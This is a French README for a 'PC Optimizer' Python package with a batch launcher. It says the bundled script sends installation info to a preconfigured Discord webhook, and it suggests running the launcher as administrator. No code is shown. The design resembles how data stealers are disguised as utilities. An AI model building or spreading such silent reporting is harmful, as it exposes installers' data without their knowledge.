════════════════════════════════════════════════════════════════
   PC OPTIMIZER - PACKAGE COMPLET D'INSTALLATION
════════════════════════════════════════════════════════════════

📁 CONTENU DU PACKAGE :
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ LANCER_ICI.bat                    ← FICHIER À LANCER
✅ send_webhook.py                   ← Webhook Discord (configuré)
✅ PC_Optimizer_Installer.py         ← Installateur principal
✅ guide_source.py                   ← Code source du guide
✅ pc_optimizer_source.py            ← Code source de l'app

🚀 COMMENT UTILISER :
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. EXTRAIRE tous les fichiers dans UN SEUL DOSSIER

2. DOUBLE-CLIQUER sur : LANCER_ICI.bat

3. Suivre les instructions à l'écran

⚠️ IMPORTANT :
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

• Python doit être installé sur votre PC
• Tous les fichiers doivent être dans le MÊME dossier
• Le webhook Discord est DÉJÀ configuré dans send_webhook.py

📊 WEBHOOK DISCORD CONFIGURÉ :
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Le webhook est déjà configuré dans send_webhook.py.
Il enverra les infos d'installation sur votre serveur Discord.

Si vous voulez CHANGER le webhook :
1. Ouvrir send_webhook.py avec un éditeur de texte
2. Modifier la ligne 16 : WEBHOOK_URL = "..."
3. Sauvegarder

🔧 DÉPANNAGE :
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❌ "Python non trouvé" ?
   → Installez Python : https://www.python.org/downloads/
   → Cochez "Add Python to PATH" lors de l'installation

❌ La fenêtre se ferme tout de suite ?
   → Tous les fichiers sont-ils dans le même dossier ?
   → Faites un clic droit sur LANCER_ICI.bat
   → "Exécuter en tant qu'administrateur"

❌ Le webhook ne marche pas ?
   → Vérifiez votre connexion Internet
   → Vérifiez que l'URL du webhook est valide sur Discord

💡 ASTUCE :
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Si vous voulez SEULEMENT tester le webhook :
→ Lancez directement : python send_webhook.py

═══════════════════════════════════════════════════════════════
Version 1.0 - Package complet prêt à l'emploi
═══════════════════════════════════════════════════════════════
